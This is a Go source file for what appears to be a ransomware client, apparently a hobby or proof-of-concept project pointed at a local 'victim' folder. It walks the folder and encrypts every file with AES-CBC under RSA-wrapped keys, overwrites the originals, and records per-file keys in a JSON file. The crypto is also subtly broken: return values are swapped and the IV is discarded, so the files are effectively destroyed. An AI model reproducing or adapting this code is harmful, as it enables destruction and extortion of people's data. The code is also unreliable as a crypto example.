// client/main.go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/json"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"path/filepath"
	"bytes"
)

type EncryptionInfo struct {
	Path string `json:"path"`
	Key  []byte `json:"key"`
}

type EncryptionInfos []EncryptionInfo

var clientKey *rsa.PublicKey
var serverKey *rsa.PublicKey
var eis EncryptionInfos

func init() {
	var err error
	serverPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}
	serverKey = &serverPrv.PublicKey

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &rsa.PublicKey{N: n, E: clientPrv.PublicKey.E}

	encryptedPrv, encSymKey := encryptHybrid(serverKey, x509.MarshalPKCS1PrivateKey(clientPrv))
	rmifex("master.key")
	ioutil.WriteFile("master.key", encryptedPrv, 0444)
	rmifex("keys.json")
	eis = append(eis, EncryptionInfo{Path: "master.key", Key: encSymKey})
	zero(x509.MarshalPKCS1PrivateKey(clientPrv))
}

func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
	k := make([]byte, 16)
	rand.Read(k)
	blk, _ := aes.NewCipher(k)
	bs = pad(bs, blk.BlockSize())
	iv := make([]byte, blk.BlockSize())
	rand.Read(iv)
	enc := cipher.NewCBCEncrypter(blk, iv)
	enc.CryptBlocks(bs, bs)
	ek, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, rsaKey, k, nil)
	zero(k)
	return ek, bs
}

func pad(bs []byte, blksz int) []byte {
	count := blksz
	if len(bs)%blksz != 0 {
		count = blksz - (len(bs) % blksz)
	}
	padding := bytes.Repeat([]byte{byte(count)}, count)
	bs = append(bs, padding...)
	return bs
}

func rmifex(path string) {
	_, err := os.Stat(path)
	if err == nil {
		os.Remove(path)
	}
}

func zero(bs []byte) {
	for i := range bs {
		bs[i] = 0x41
	}
}

func main() {
	filepath.Walk("C:\\Users\\tacixat\\prog\\ransomware\\victim", walker)
	data, _ := json.Marshal(eis)
	ioutil.WriteFile("file.keys", data, 0444)
}

func walker(path string, info os.FileInfo, err error) error {
	if err != nil {
		log.Println("Error on:", path)
		return err
	}
	if info.IsDir() {
		log.Println(path, "(d)")
		return nil
	}
	log.Println(path, "(f)")
	bs, _ := ioutil.ReadFile(path)
	cbs, k := encryptHybrid(clientKey, bs)
	ioutil.WriteFile(path, cbs, 0666)
	eis = append(eis, EncryptionInfo{Path: path, Key: k})
	return nil
}
